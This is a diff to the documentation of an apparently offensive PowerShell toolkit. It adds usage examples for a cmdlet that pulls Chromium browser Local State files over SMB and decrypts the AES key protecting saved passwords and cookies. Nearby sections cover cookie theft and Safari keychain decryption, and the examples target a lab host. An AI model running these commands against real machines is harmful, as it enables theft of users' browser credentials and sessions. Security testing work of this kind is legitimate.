@@ -641,6 +641,23 @@ Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName '
 Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Edge -AllProfiles -MasterKeys $userKeys
 ```
 
+#### Get-TBOChromiumStateKeys
+
+Reads a Chromium-based browser `Local State` file for user profiles over SMB and decrypts `os_crypt.encrypted_key` to obtain the AES state key used for AES-GCM v10/v11 secrets.
+Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+# Edge (Chromium) for a specific user
+Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -Browser Edge -MasterKeys $userKeys
+
+# Select common output fields
+Get-TBOChromiumStateKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Brave -MasterKeys $userKeys |
+  Select-Object UserName, Browser, StateKeyHex, MasterKeyGuid, HmacValidated, FailureReason
+```
+
 #### Get-TBOSafariKeychain
 
 Parses Safari for Windows `keychain.plist` files and decrypts DPAPI-protected password entries.
